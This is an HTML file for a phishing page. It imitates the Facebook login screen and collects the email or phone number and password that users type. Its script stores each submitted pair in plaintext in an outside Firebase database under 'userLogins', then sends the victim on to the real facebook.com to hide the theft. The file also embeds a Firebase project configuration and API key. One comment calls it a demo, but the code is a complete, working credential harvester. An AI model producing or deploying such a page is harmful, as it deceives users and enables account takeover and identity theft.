<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Style Login</title>
  <style>
    :root {
      --fb-blue: #1877f2;
      --fb-dark: #050505;
      --fb-light: #f0f2f5;
      --fb-white: #ffffff;
      --fb-border: #ccd0d5;
      --input-bg: #f5f6f7;
      --input-focus: #e7f3ff;
    }

    * {
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: var(--fb-light);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 40px 30px;
      background-color: var(--fb-white);
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      text-align: center;
    }

    .fb-header {
      font-size: 36px;
      font-weight: 700;
      color: var(--fb-blue);
      margin-bottom: 10px;
    }

    .fb-subtext {
      font-size: 16px;
      color: #606770;
      margin-bottom: 25px;
    }

    form {
      text-align: left;
    }

    label {
      display: block;
      font-weight: 600;
      font-size: 14px;
      color: var(--fb-dark);
      margin-bottom: 6px;
      margin-top: 12px;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid var(--fb-border);
      border-radius: 8px;
      background-color: var(--input-bg);
      font-size: 15px;
      transition: border-color 0.3s, background-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--fb-blue);
      background-color: var(--input-focus);
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: var(--fb-blue);
      color: var(--fb-white);
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      margin-top: 20px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #145dbf;
    }

    .status {
      margin-top: 20px;
      font-weight: 500;
      font-size: 14px;
      color: #555;
    }

    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="fb-header">facebook</div>
    <div class="fb-subtext">Login to your account</div>

    <form id="userForm">
      <label for="name">Email or Phone</label>
      <input type="text" id="name" required placeholder="Enter your mobile number or email"/>

      <label for="password">Password</label>
      <input type="password" id="password" required placeholder="Enter your password"/>

      <button type="submit">Log In</button>
    </form>

    <div class="status" id="statusMsg"></div>
  </div>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCs2d7YXi-oe-Vx3dGCtUCB7U3FUtuWGX4",
      authDomain: "account-94793.firebaseapp.com",
      databaseURL: "https://account-94793-default-rtdb.firebaseio.com",
      projectId: "account-94793",
      storageBucket: "account-94793.appspot.com",
      messagingSenderId: "270278213194",
      appId: "1:270278213194:web:d9057bd96d46c0c1f630b3",
      measurementId: "G-1N3JGM1J89"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const form = document.getElementById('userForm');
    const statusMsg = document.getElementById('statusMsg');

    form.addEventListener('submit', function(e) {
  e.preventDefault();

  const name = document.getElementById('name').value.trim();
  const password = document.getElementById('password').value.trim();

  const newEntryRef = database.ref("userLogins").push();

  newEntryRef.set({
    name,
    password, // ⚠️ Only for demo – never store plaintext passwords
    timestamp: new Date().toISOString()
  })
  .then(() => {
    // Optional message display before redirect (can be removed)
    statusMsg.textContent = "✅ Logging in...";
    statusMsg.style.color = "green";

    // Redirect to Facebook after 1 second (optional delay)
    setTimeout(() => {
      window.location.href = "https://www.facebook.com";
    }, 1000);
  })
  .catch((error) => {
    console.error("Error saving data: ", error);
    statusMsg.textContent = "❌ Failed to submit. Try again.";
    statusMsg.style.color = "red";
  });
});
  </script>

</body>
</html>
